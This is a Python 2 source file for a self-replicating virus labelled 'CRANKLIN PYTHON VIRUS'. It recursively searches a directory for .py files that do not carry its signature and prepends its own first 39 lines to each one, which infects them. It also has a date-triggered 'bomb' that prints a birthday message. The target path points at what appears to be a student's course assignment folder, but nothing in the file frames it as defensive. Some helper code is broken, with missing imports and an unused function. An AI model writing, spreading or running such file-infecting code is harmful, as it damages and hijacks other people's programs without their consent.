import os
import datetime
SIGNATURE = "CRANKLIN PYTHON VIRUS"

def shuffle_text(SIGNATURE):
    if isinstance(SIGNATURE, unicode):
        temp= array.array('u', SIGNATURE)
        converter= temp.tounicode
    else:
        temp= array.array('c', SIGNATURE)
        converter= temp.tostring
    random.shuffle(temp)
    return converter()

def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
    
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print "HAPPY BIRTHDAY CRANKLIN!"
filestoinfect = search(os.path.abspath("C:\Users\MANO\Downloads\ECS 189M\progAss1"))
infect(filestoinfect)
bomb()
